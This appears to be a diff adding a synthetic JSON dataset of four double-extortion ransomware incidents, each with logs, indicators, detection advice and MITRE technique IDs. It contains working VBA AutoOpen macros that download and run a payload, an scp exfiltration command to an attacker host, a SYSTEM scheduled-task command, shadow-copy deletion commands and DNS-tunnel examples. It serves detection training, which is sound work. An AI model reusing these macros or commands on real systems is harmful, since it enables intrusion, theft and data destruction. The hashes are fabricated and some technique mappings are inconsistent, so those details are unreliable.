@@ -1,0 +1,265 @@
+{
+  "samples": [
+    {
+      "scenario": "Double extortion ransomware campaign initiated through compromised RDP credentials, enabling attacker lateral movement and deployment of ransomware encrypting critical business files while exfiltrating confidential databases via an encrypted SSH tunnel to attacker-controlled infrastructure. The ransomware was executed via a scheduled task created remotely, and exfiltration was masked inside SSH traffic to evade detection.",
+      "technical_data": {
+        "rdp_attack_details": {
+          "event_log_excerpt": "Date: 2023-05-10 02:15:47\nEventID: 4624\nAccount Name: attacker_user\nLogon Type: 10 (RemoteInteractive)\nSource Network Address: 203.0.113.45\n",
+          "failed_attempts": 5,
+          "successful_login_ip": "203.0.113.45"
+        },
+        "scheduled_task_creation": {
+          "task_name": "WindowsUpdateService",
+          "command": "schtasks /create /sc once /tn WindowsUpdateService /tr \"C:\\Windows\\Temp\\encrypt.exe\" /st 03:00 /ru SYSTEM"
+        },
+        "ransomware_file_hashes": {
+          "MD5": "9f8d7c6b5e4a3b2c1d0e9f8a7b6c5d4e",
+          "SHA-1": "3b6e27d5a8e74b2c9f8a7d6c5b4e3f2a1d7c6b5a",
+          "SHA-256": "f3d2c1b0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2"
+        },
+        "file_system_artifacts": [
+          "D:\\Finance\\encrypted\\README_DECRYPT.txt",
+          "C:\\Windows\\Temp\\encrypt.exe",
+          "Registry key created: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WindowsUpdateService = C:\\Windows\\Temp\\encrypt.exe"
+        ],
+        "network_packet_capture_excerpt": "Frame 78: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 1\nEthernet II, Src: 00:0a:95:9d:68:16, Dst: 00:16:3e:5e:6c:00\nInternet Protocol Version 4, Src: 10.10.10.22, Dst: 198.51.100.80\nTransmission Control Protocol, Src Port: 55555, Dst Port: 22, Seq: 12345, Ack: 67890, Len: 1460\nSSH Protocol Data\n    Encrypted packet data stream",
+        "ssh_tunnel_exfiltration_command": "scp -P 22 D:\\Finance\\confidential.db attacker@198.51.100.80:/data/exfiltration/",
+        "process_creation_chain": [
+          "winlogon.exe -> svchost.exe -> schtasks.exe /create ...",
+          "schtasks.exe -> encrypt.exe",
+          "encrypt.exe -> cmd.exe /c vssadmin delete shadows /all /quiet"
+        ],
+        "security_logs": [
+          "2023-05-10T02:16:01Z Security Event ID 4624: Successful Remote Desktop logon for attacker_user from 203.0.113.45",
+          "2023-05-10T03:02:45Z Windows Defender: Ransomware behavior detected: file encryption in D:\\Finance\\encrypted",
+          "2023-05-10T03:05:12Z Endpoint security alert: Scheduled task 'WindowsUpdateService' created with suspicious executable",
+          "2023-05-10T03:10:30Z Network IDS: Alert - SSH traffic containing large outbound data transfer to 198.51.100.80 on port 22"
+        ]
+      },
+      "indicators": {
+        "malicious_domains": [
+          "198.51.100.80"
+        ],
+        "file_hashes": [
+          "9f8d7c6b5e4a3b2c1d0e9f8a7b6c5d4e",
+          "3b6e27d5a8e74b2c9f8a7d6c5b4e3f2a1d7c6b5a",
+          "f3d2c1b0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2"
+        ],
+        "registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WindowsUpdateService"
+        ],
+        "smtp_senders": [],
+        "processes": [
+          "schtasks.exe",
+          "encrypt.exe",
+          "cmd.exe"
+        ],
+        "ip_addresses": [
+          "203.0.113.45",
+          "198.51.100.80"
+        ]
+      },
+      "detection_method": "Monitor for unusual RDP login patterns and multiple failed login attempts. Use scheduled task monitoring to detect creation of tasks running unknown executables. Employ Endpoint Detection and Response (EDR) to detect ransomware encryption activity and suspicious process chains. Network monitoring to identify SSH tunnels with abnormal large data transfers to external IPs. Correlate logs for process creation and network activity to detect exfiltration.",
+      "relevant_mitre_techniques": [
+        "T1078.002",
+        "T1053.005",
+        "T1486",
+        "T1041",
+        "T1071.004",
+        "T1490",
+        "T1005"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack leveraging a malicious macro in a Word document attachment sent via spear phishing email. The macro downloads and executes ransomware which encrypts files and simultaneously exfiltrates data via DNS tunneling to bypass perimeter defenses. The DNS exfiltration was identified through unusual DNS query patterns with large payloads encoded in subdomains.",
+      "technical_data": {
+        "email_phishing": {
+          "raw_email_headers": "Return-Path: <alerts@securemail.com>\r\nReceived: from mail.securemail.com (mail.securemail.com [198.51.100.25])\r\n\tby victim-mailserver.company.local with ESMTPS id 7A8F1234B5\r\n\tfor <employee@company.com>; Fri, 12 May 2023 09:45:12 +0000 (UTC)\r\nReceived-SPF: pass (company.com: domain of securemail.com designates 198.51.100.25 as permitted sender)\r\nAuthentication-Results: victim-mailserver.company.local; spf=pass smtp.mailfrom=securemail.com; dkim=pass header.d=securemail.com; dmarc=pass\r\nFrom: \"SecureMail Alerts\" <alerts@securemail.com>\r\nTo: employee@company.com\r\nSubject: Important: Invoice Document Attached\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_000_0045_01D9C803.9D7B7E10\"",
+          "email_body_excerpt": "------=_NextPart_000_0045_01D9C803.9D7B7E10\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nDear Employee,\r\n\r\nPlease find the attached invoice for your review.\r\n\r\nBest Regards,\r\nSecureMail Team\r\n------=_NextPart_000_0045_01D9C803.9D7B7E10--",
+          "smtp_transaction_log": "220 mail.securemail.com ESMTP Postfix\r\nEHLO victim-mailserver.company.local\r\n250-mail.securemail.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\nMAIL FROM:<alerts@securemail.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA OMITTED]\r\n.\r\n250 2.0.0 Ok: queued as 7A8F1234B5"
+        },
+        "macro_code_snippet": "Sub AutoOpen()\n Dim strURL As String\n strURL = \"http://cdn.malicious-site.com/payload.exe\"\n Dim WinHttpReq As Object\n Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\n WinHttpReq.Open \"GET\", strURL, False\n WinHttpReq.Send\n If WinHttpReq.Status = 200 Then\n   Dim oStream As Object\n   Set oStream = CreateObject(\"ADODB.Stream\")\n   oStream.Open\n   oStream.Type = 1\n   oStream.Write WinHttpReq.responseBody\n   oStream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\n   oStream.Close\n   Shell Environ(\"TEMP\") & \"\\payload.exe\"\n End If\nEnd Sub",
+        "ransomware_file_hashes": {
+          "MD5": "b6a8f3d2c4e7f5918273645a9b1e0f64",
+          "SHA-1": "d9e8c7b6a5f49382716e4d3c2b1a0f9e8d7c6b5a",
+          "SHA-256": "a1b2c3d4e5f60718273645a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7182930"
+        },
+        "dns_exfiltration_patterns": [
+          "Large volume of TXT DNS queries to exfiltrator.com with base64 encoded data in subdomain labels.",
+          "Example DNS query: dGhpcy1pcw==.dGVzdA==.exfiltrator.com"
+        ],
+        "network_packet_capture_excerpt": "Frame 125: 512 bytes on wire, 512 bytes captured\nDNS Query for: dGhpcy1pcw==.dGVzdA==.exfiltrator.com Type: TXT\nDNS Response: TXT record with 256 bytes of data\nMultiple similar queries observed in a rapid sequence",
+        "process_creation_chain": [
+          "winword.exe -> powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\employee\\AppData\\Local\\Temp\\payload.ps1",
+          "powershell.exe -> ransomware.exe",
+          "ransomware.exe -> cmd.exe /c vssadmin delete shadows /all /quiet"
+        ],
+        "security_logs": [
+          "2023-05-12T09:46:00Z Endpoint security: Macro execution detected in winword.exe",
+          "2023-05-12T09:50:30Z File system alert: Mass file encryption detected in C:\\Users\\employee\\Documents\\encrypted",
+          "2023-05-12T09:55:10Z DNS monitoring: Alert - High volume of TXT queries to exfiltrator.com with suspicious encoded data"
+        ]
+      },
+      "indicators": {
+        "malicious_domains": [
+          "cdn.malicious-site.com",
+          "exfiltrator.com"
+        ],
+        "file_hashes": [
+          "b6a8f3d2c4e7f5918273645a9b1e0f64",
+          "d9e8c7b6a5f49382716e4d3c2b1a0f9e8d7c6b5a",
+          "a1b2c3d4e5f60718273645a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7182930"
+        ],
+        "registry_keys": [],
+        "smtp_senders": [
+          "alerts@securemail.com"
+        ],
+        "processes": [
+          "winword.exe",
+          "powershell.exe",
+          "ransomware.exe",
+          "cmd.exe"
+        ],
+        "dns_domains": [
+          "exfiltrator.com"
+        ]
+      },
+      "detection_method": "Employ email gateway scanning for malicious macros and attachment analysis. Monitor for macro execution events in Office applications. Track DNS query volumes and detect anomalous TXT record queries with base64 encoded data. Endpoint Detection and Response (EDR) to detect ransomware encryption behavior and suspicious process chains deleting shadow copies. Correlate DNS logs with file system and process monitoring for exfiltration detection.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1204.002",
+        "T1486",
+        "T1041",
+        "T1071.004",
+        "T1490",
+        "T1005"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack initiated through a compromised RDP session, leading to deployment of ransomware that encrypts files and exfiltrates sensitive data via an encrypted DNS tunnel. Attackers utilized a custom C++ ransomware binary with embedded DNS exfiltration capabilities to bypass traditional network monitoring.",
+      "technical_data": {
+        "email_phishing": null,
+        "rdp_access_logs": [
+          "2023-05-10T09:15:43Z RDP login success: User=admin, IP=203.0.113.45",
+          "2023-05-10T09:17:12Z RDP session initiated on server01.corp.local from IP=203.0.113.45"
+        ],
+        "ransomware_file_hashes": {
+          "MD5": "b3f5e9d7c1a8e2f4d0a7b6c5e1f8d9a2",
+          "SHA-1": "c7a9e8f1b3d5a2c4e6f7b8d9a0c1e2f3b4d5a6c7",
+          "SHA-256": "9f7d6c5b4a3928176e5d4c3b2a1f8e7d6c5b4a3928176e5d4c3b2a1f8e7d6c5b"
+        },
+        "file_system_artifacts": [
+          "C:\\Users\\admin\\Desktop\\ENCRYPTED_FILES\\README_DECRYPT.txt",
+          "C:\\Windows\\Temp\\ransomware_exec.exe",
+          "Registry key created: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Windows\\Temp\\ransomware_exec.exe"
+        ],
+        "network_packet_capture_excerpt": "Frame 104: 512 bytes on wire, 512 bytes captured\nDNS Query: exfil.domain.com TXT record request\nDNS Response: TXT record containing base64 encoded data\nEncrypted DNS tunnel used to exfiltrate data in small chunks",
+        "dns_exfiltration_sample": "Query: id=1234 type=TXT name=datachunk1.exfil.domain.com\nResponse: TXT \"VGhpcyBpcyBhIGJhc2U2NCBlbmNvZGVkIGV4ZmlsdHJhdGlvbiBvZiBzZW5zaXRpdmUgZmlsZSBkYXRh\"",
+        "process_creation_chain": [
+          "rdpinit.exe -> ransomware_exec.exe",
+          "ransomware_exec.exe -> powershell.exe -Command Remove-ItemShadowCopies -Force"
+        ],
+        "security_logs": [
+          "2023-05-10T09:20:45Z Security Event ID 4624: Successful logon: User=admin, Source IP=203.0.113.45",
+          "2023-05-10T09:23:11Z Windows Defender Alert: Suspicious executable detected: ransomware_exec.exe",
+          "2023-05-10T09:25:30Z DNS Server: High volume of TXT record queries to exfil.domain.com detected"
+        ]
+      },
+      "indicators": {
+        "malicious_domains": [
+          "exfil.domain.com"
+        ],
+        "file_hashes": [
+          "b3f5e9d7c1a8e2f4d0a7b6c5e1f8d9a2",
+          "c7a9e8f1b3d5a2c4e6f7b8d9a0c1e2f3b4d5a6c7",
+          "9f7d6c5b4a3928176e5d4c3b2a1f8e7d6c5b4a3928176e5d4c3b2a1f8e7d6c5b"
+        ],
+        "registry_keys": [
+          "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+        ],
+        "smtp_senders": [],
+        "processes": [
+          "rdpinit.exe",
+          "ransomware_exec.exe",
+          "powershell.exe"
+        ]
+      },
+      "detection_method": "Monitor RDP access logs for unusual IP addresses and times. Detect anomalous DNS TXT query volume and patterns using DNS analytics tools. Endpoint Detection and Response (EDR) to identify suspicious executable launches and shadow copy deletion commands. Network IDS to flag encrypted DNS tunneling behavior. Correlate registry autorun modifications with process creation events for ransomware activity.",
+      "relevant_mitre_techniques": [
+        "T1076",
+        "T1486",
+        "T1041",
+        "T1566.002",
+        "T1490",
+        "T1005",
+        "T1071.004"
+      ]
+    },
+    {
+      "scenario": "Double extortion ransomware attack initiated through a malicious macro in a Word document delivered via spear-phishing email. The macro executed obfuscated VBA code to download and execute ransomware that encrypted files and exfiltrated sensitive data using FTP to a remote attacker-controlled server. Exfiltration was disguised as legitimate file transfer traffic.",
+      "technical_data": {
+        "email_phishing": {
+          "raw_email_headers": "Return-Path: <alerts@banking-secure.com>\r\nReceived: from mail.banking-secure.com (mail.banking-secure.com [198.51.100.77])\r\n\tby victim-mailserver.corp.local (Postfix) with ESMTPS id 7F3D9B7C2E\r\n\tfor <victim@company.com>; Thu, 11 May 2023 11:42:10 +0000 (UTC)\r\nReceived-SPF: pass (company.com: domain of banking-secure.com designates 198.51.100.77 as permitted sender)\r\nAuthentication-Results: victim-mailserver.corp.local; spf=pass smtp.mailfrom=banking-secure.com; dkim=pass header.d=banking-secure.com; dmarc=pass\r\nFrom: \"Banking Secure Alert\" <alerts@banking-secure.com>\r\nTo: victim@company.com\r\nSubject: Important: Review Your Account Statement\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_000_0045_01D9C3F1.9A7B2C0D\"",
+          "email_body_excerpt": "------=_Part_000_0045_01D9C3F1.9A7B2C0D\r\nContent-Type: text/html; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<p>Dear Customer,</p>\r\n<p>Please find your latest account statement attached. Enable macros to view the report correctly.</p>\r\n<p>Best Regards,<br>Banking Secure Team</p>\r\n------=_Part_000_0045_01D9C3F1.9A7B2C0D--",
+          "smtp_transaction_log": "220 mail.banking-secure.com ESMTP Postfix\r\nEHLO victim-mailserver.corp.local\r\n250-mail.banking-secure.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<alerts@banking-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA OMITTED]\r\n.\r\n250 2.0.0 Ok: queued as 7F3D9B7C2E"
+        },
+        "macro_script_excerpt": "Sub AutoOpen()\r\n Dim strURL As String\r\n strURL = \"http://ftp-malicious[.]com/payload.exe\"\r\n Dim WinHttpReq As Object\r\n Set WinHttpReq = CreateObject(\"Microsoft.XMLHTTP\")\r\n WinHttpReq.Open \"GET\", strURL, False\r\n WinHttpReq.Send\r\n If WinHttpReq.Status = 200 Then\r\n  Dim oStream As Object\r\n  Set oStream = CreateObject(\"ADODB.Stream\")\r\n  oStream.Open\r\n  oStream.Type = 1\r\n  oStream.Write WinHttpReq.ResponseBody\r\n  oStream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\r\n  oStream.Close\r\n  Shell Environ(\"TEMP\") & \"\\payload.exe\"\r\n End If\r\nEnd Sub",
+        "ransomware_file_hashes": {
+          "MD5": "d9f8c7b6a5e4f3d2c1b0a9876543210f",
+          "SHA-1": "e4d3c2b1f0a9e8d7c6b5a49382716f5e4d3c2b1f0",
+          "SHA-256": "f8e7d6c5b4a3928176f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e"
+        },
+        "file_system_artifacts": [
+          "C:\\Users\\victim\\Documents\\ENCRYPTED\\README_DECRYPT.txt",
+          "C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe",
+          "Registry key created: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater = C:\\Users\\victim\\AppData\\Local\\Temp\\payload.exe"
+        ],
+        "network_packet_capture_excerpt": "Frame 88: FTP session\nFTP Command: USER attacker\nFTP Command: PASS ********\nFTP Command: STOR exfiltrated_data.zip\nFTP Data: Binary stream containing encrypted sensitive files",
+        "ftp_exfiltration_sample": "STOR exfiltrated_data.zip\n[Binary data stream of exfiltrated encrypted files]",
+        "process_creation_chain": [
+          "winword.exe -> rundll32.exe -> powershell.exe -EncodedCommand ...",
+          "powershell.exe -> payload.exe",
+          "payload.exe -> cmd.exe /c vssadmin delete shadows /all /quiet"
+        ],
+        "security_logs": [
+          "2023-05-11T11:45:02Z Security Event ID 4688: New Process Created: Creator Process Name: winword.exe, Process Name: rundll32.exe, Command Line includes suspicious encoded PowerShell",
+          "2023-05-11T11:47:30Z Windows Defender: Detected ransomware activity in C:\\Users\\victim\\Documents\\ENCRYPTED",
+          "2023-05-11T11:50:10Z Network IDS: FTP session detected uploading suspicious archive to ftp-malicious.com"
+        ]
+      },
+      "indicators": {
+        "malicious_domains": [
+          "ftp-malicious.com"
+        ],
+        "file_hashes": [
+          "d9f8c7b6a5e4f3d2c1b0a9876543210f",
+          "e4d3c2b1f0a9e8d7c6b5a49382716f5e4d3c2b1f0",
+          "f8e7d6c5b4a3928176f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c2b1a0f9e"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+        ],
+        "smtp_senders": [
+          "alerts@banking-secure.com"
+        ],
+        "processes": [
+          "winword.exe",
+          "rundll32.exe",
+          "powershell.exe",
+          "payload.exe",
+          "cmd.exe"
+        ]
+      },
+      "detection_method": "Use email gateway filters to detect and quarantine emails with suspicious attachments and macro content. Monitor process creation logs for Office applications spawning PowerShell or rundll32 with encoded commands. Network IDS to identify unusual FTP sessions and large file uploads to uncommon servers. Endpoint Detection and Response (EDR) to detect ransomware file encryption and shadow copy deletion. Registry monitoring for autorun persistence.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1204.002",
+        "T1059.001",
+        "T1486",
+        "T1041",
+        "T1071.004",
+        "T1490"
+      ]
+    }
+  ]
+}
